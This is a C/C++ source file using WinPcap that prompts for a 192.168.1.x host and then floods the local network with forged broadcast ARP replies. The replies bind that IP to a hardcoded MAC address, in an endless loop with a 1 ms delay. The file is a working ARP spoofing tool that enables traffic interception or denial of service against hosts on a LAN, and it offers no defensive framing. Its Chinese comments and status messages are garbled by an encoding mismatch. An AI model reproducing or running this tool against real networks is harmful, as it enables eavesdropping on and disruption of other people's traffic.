#include "arpcap.h"

#define HARDWARE_ADDR "081016CC3684"

int main(int argc,char* argv[])
{
	//WinExec("arp.exe -s 192.168.1.1 08-10-17-cc-36-84",SW_SHOW);

	printf("IP:192.168.1.");
	scanf("%d",&Ip);
	InitDevice();
	InitPacket();

	int size = sizeof(arp);
	/*static long slp = 0;*/

	printf("�������...\n������...\n");
	while (1)
	{
		if (pcap_sendpacket(ahandle,(unsigned char*)&arp,size) != 0)
		{
			printf("����ʧ��!\n");
		}
		Sleep(1);
	}
	system("pause");
	return 1;
}

//��ʼ���豸
void InitDevice()
{
	if (pcap_findalldevs(&alldev,errbuf) == -1)
	{
		printf("����豸ʧ��!\n%s",errbuf);
		exit(0);
	}

	int i = 0;
	for(device=alldev; device; device=device->next)                  //��ӡ��ϵͳ�����е�����
    {
        printf("%d. %s", ++i, device->name);
        if (device->description)
            printf(" (%s)\n", device->description);
        else
            printf(" (No description available)\n");
    }
    
    if(i==0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return;
    }
    
	int inum = 0;
    printf("Enter the interface number (1-%d):",i);
    scanf("%d", &inum);                                //����һ����ѡ���������
    
    if(inum < 1 || inum > i)
    {
        printf("\nInterface number out of range.\n");
       
        pcap_freealldevs(alldev);
        return;
    }
    
    
    for(device=alldev, i=0; i< inum-1 ;device=device->next, i++);  //�Ӹղ�������������ҵ��ʵ�������ָ��

	ahandle = pcap_open_live(device->name,65535,1,1000,errbuf);
	if (!ahandle)
	{
		printf("���豸ʧ��!\n%s",errbuf);
		FreeDevice();
		exit(0);
	}
}

//�����ͷ�
void FreeDevice()
{
	pcap_freealldevs(alldev);
}

//�������ݰ�
void InitPacket()
{
	memset(&arp,0,sizeof(arp));

	WriteHard(&arp.eth.dst_mac[0],"FFFFFFFFFFFF");
	WriteHard(&arp.eth.src_mac[0],HARDWARE_ADDR);
	arp.eth.eth_t = htons(ETH_ARP);

	arp.arp.arp_hdr	=	htons(ARP_HARDWARE);
	arp.arp.arp_pro	=	htons(ETH_IP);
	arp.arp.arp_hln	=	6;
	arp.arp.arp_pln	=	4;
	arp.arp.arp_opt			=	htons(ARP_REPLY);	
	WriteHard(&arp.arp.arp_sha[0],HARDWARE_ADDR);

	char RemoteIP[1024]={0};
	wsprintf(RemoteIP,"192.168.1.%d",Ip);

	arp.arp.arp_spa	=	inet_addr(/*"192.168.1.92"*/RemoteIP);
	WriteHard(&arp.arp.arp_tha[0],	"FFFFFFFFFFFF");
	arp.arp.arp_tpa	=	inet_addr("255.255.255.255");
}

//д��MAC��ַ
void WriteHard(unsigned char *Hard,char* Src)
{
	char hchr=0;
	char lchr=0;
	int j=0;
	int rst;
	
	Src = strupr(_strdup(Src));

	for (int i=0;i<(int)strlen(Src);(++i)++)
	{
		lchr = Src[i];
		hchr = Src[i+1];
		lchr = Hex(lchr);
		hchr = Hex(hchr);

		rst = lchr * 16 + hchr;
		Hard[j] = rst;
		j++;
	}
}

//ʮ������ת��
char Hex(char Src)
{
	if (Src >= 'A' && Src <= 'Z')
		return (Src-55);
	else
		return (Src-48);
}